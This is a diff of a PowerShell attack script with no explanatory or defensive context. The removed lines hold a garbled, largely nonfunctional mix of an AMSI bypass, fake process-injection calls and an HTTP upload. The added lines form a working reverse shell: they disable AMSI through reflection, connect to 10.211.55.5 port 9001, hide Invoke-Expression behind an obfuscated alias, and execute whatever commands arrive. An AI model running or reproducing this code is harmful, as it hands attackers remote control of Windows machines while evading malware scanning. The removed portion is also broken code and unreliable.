@@ -1,62 +1,33 @@
 
-$IP = "10.211.55.5"
-$PORT = 9001
+$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b=$s.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
 
 
-$key = New-Object Byte[] 32
-$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
-$rng.GetBytes($key)
-
-$aes = New-Object System.Security.Cryptography.AesManaged
-$aes.Key = $key
-$aes.GenerateIV()
-$iv = $aes.IV
+$i = "10.211.55.5"
+$p = 9001
 
 
-$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$f = $a.GetField('amsiInitFailed','NonPublic,Static')
-$f.SetValue($null,$true)
+$t = [System.Net.Sockets.TcpClient]::new($i, $p)
+$z = $t.GetStream()
 
 
-$targetProc = Get-Process -Name svchost
-$handle = [System.Runtime.InteropServices.Marshal]::GetPointerToStringAuto($targetProc.Handle)
-$remoteMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.IntPtr]::Size)
+Set-Alias -Name 'sh' -Value ([char]73+[char]101+[char]120) -Option AllScope
 
 
-$shellcode = [System.BitConverter]::GetBytes(0xbf) 
-
-
-$hProcess = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE("kernel32.dll")
-$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetProcAddress($hProcess, "VirtualAllocEx")
-$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetProcAddress($hProcess, "WriteProcessMemory")
-$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetProcAddress($hProcess, "CreateRemoteThread")
-
-$lpAddress = [System.IntPtr]::Zero
-$dwSize = $shellcode.Length
-$flAllocationType = 0x40
-$flProtect = 0x40
-
-[System.Runtime.InteropServices.Marshal]::Invoke($VirtualAllocEx, $targetProc.Handle, $lpAddress, $dwSize, $flAllocationType, $flProtect)
-
-
-$envKey = "YOUR_ENV_VAR"
-If ($env:$envKey -eq $null) {
-Exit
+$d = New-Object Byte[] 65536
+While(($len = $z.Read($d, 0, $d.Length)) -ne 0) {
+    $c = [System.Text.Encoding]::ASCII.GetString($d, 0, $len)
+    
+   
+    $o = try {
+Sh $c 2>&1 | Out-String
+    } catch {
+        $_.Exception.Message
+    }
+    
+   
+    $f = $o + "PS " + (pwd).Path + "> "
+    $b = [System.Text.Encoding]::ASCII.GetBytes($f)
+    $z.Write($b, 0, $b.Length)
 }
-
-
-$httpRequest = [System.Net.WebRequest]::Create("https://example.com")
-$httpRequest.Method = "POST"
-$httpRequest.Headers.Add("User-Agent", "Mozilla/5.0")
-
-
-$requestStream = $httpRequest.GetRequestStream()
-$requestStream.Write($shellcode, 0, $shellcode.Length)
-$requestStream.Close()
-
-
-$response = $httpRequest.GetResponse()
-$response.Close()
-
-
-[System.Runtime.InteropServices.Marshal]::FreeHGlobal($remoteMem)
